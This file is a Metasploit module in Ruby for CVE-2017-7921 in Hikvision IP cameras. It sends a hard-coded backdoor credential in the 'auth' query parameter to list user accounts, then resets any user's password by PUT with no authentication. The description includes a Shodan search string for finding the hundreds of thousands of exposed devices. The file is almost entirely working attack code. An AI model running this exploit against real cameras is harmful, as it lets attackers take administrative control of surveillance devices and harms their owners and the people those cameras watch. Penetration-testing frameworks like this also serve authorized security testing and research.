##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Hikvision IP Camera Unauthenticated Password Change Via Backdoor Creds',
        'Description' => %q{
          Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account.
          The vulnerability has been present in Hikvision products since 2014. In addition to Hikvision-branded devices, it
          affects many white-labeled camera products sold under a variety of brand names.

          Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time
          of publishing (shodan search: '"App-webs" "200 OK"'). Some of these devices can never be patched due to to the
          vendor not building in mechanisms to allow the affected device to be upgraded to patched firmware.

          This module allows the attacker to perform an unauthenticated password change of any user account on
          a vulnerable Hikvision IP Camera. Attackers can use this to gain full administrative access to the affected device.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Monte Crypto', # Researcher who discovered and disclosed this vulnerability
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Developer and author of this Metasploit module
        ],
        'References' => [
          [ 'CVE', '2017-7921' ],
          [ 'PACKETSTORM', '144097' ],
          [ 'URL', 'https://ipvm.com/reports/hik-exploit' ],
          [ 'URL', 'https://attackerkb.com/topics/PlLehGSmxT/cve-2017-7921' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2017/Sep/23' ]
        ],
        'DisclosureDate' => '2017-09-23',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [ true, 'Username for password change', 'admin']),
        OptString.new('PASSWORD', [ true, 'New Password (at least 2 UPPERCASE, 2 lowercase and 2 special characters', 'Pa$$W0rd']),
        OptInt.new('ID', [ true, 'ID (default 1 for admin)', 1]),
        OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true])
      ]
    )
  end

  def report_creds
    if datastore['SSL'] == true
      service_proto = 'https'
    else
      service_proto = 'http'
    end
    service_data = {
      address: datastore['RHOSTS'],
      port: datastore['RPORT'],
      service_name: service_proto,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: datastore['USERNAME'],
      private_data: datastore['PASSWORD'],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    cred_res = create_credential_login(login_data)
    unless cred_res.nil?
      print_status("Credentials for #{datastore['USERNAME']} were added to the database...")
    end
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'Security', 'users'),
        'vars_get' => {
          'auth' => 'YWRtaW46MTEK'
        }
      })
    rescue StandardError => e
      elog("#{peer} - Communication error occurred: #{e.message}", error: e)
      return Exploit::CheckCode::Unknown("#{peer} - Communication error occurred: #{e.message}")
    end

    if res.nil?
      return Exploit::CheckCode::UnexpectedReply('No response recieved from the target!')
    elsif res && res.code == 200
      xml_res = res.get_xml_document
      print_status('Following users are available for password reset...')
      xml_res.css('User').each do |user|
        print_status("USERNAME:#{user.at_css('userName').content} | ID:#{user.at_css('id').content} | ROLE:#{user.at_css('userLevel').content}")
      end
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    return unless check == Exploit::CheckCode::Vulnerable

    begin
      print_status("Starting the password reset for #{datastore['USERNAME']}...")
      post_data = %(<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>#{datastore['ID'].to_s.encode(xml: :text)}</id>\r\n<userName>#{datastore['USERNAME']&.encode(xml: :text)}</userName>\r\n<password>#{datastore['PASSWORD']&.encode(xml: :text)}</password>\r\n</User>)

      res = send_request_cgi({
        'method' => 'PUT',
        'uri' => normalize_uri(target_uri.path, 'Security', 'users'),
        'vars_get' => {
          'auth' => 'YWRtaW46MTEK'
        },
        'ctype' => 'application/xml',
        'data' => post_data
      })
    rescue StandardError => e
      print_error("#{peer} - Communication error occurred: #{e.message}")
      elog("#{peer} - Communication error occurred: #{e.message}", error: e)
      return nil
    end

    if res.nil?
      fail_with(Failure::Unknown, 'Target server did not respond to the password reset request')
    elsif res.code == 200
      print_good("Password reset for #{datastore['USERNAME']} was successfully completed!")
      print_status("Please log in with your new password: #{datastore['PASSWORD']}")
      if datastore['STORE_CRED'] == true
        report_creds
      end
    else
      print_error('Unknown Error. Password reset was not successful!')
      print_status("Please check the password rules and ensure that the user account/ID:#{datastore['USERNAME']}/#{datastore['ID']} exists!")
      return
    end
  end
end
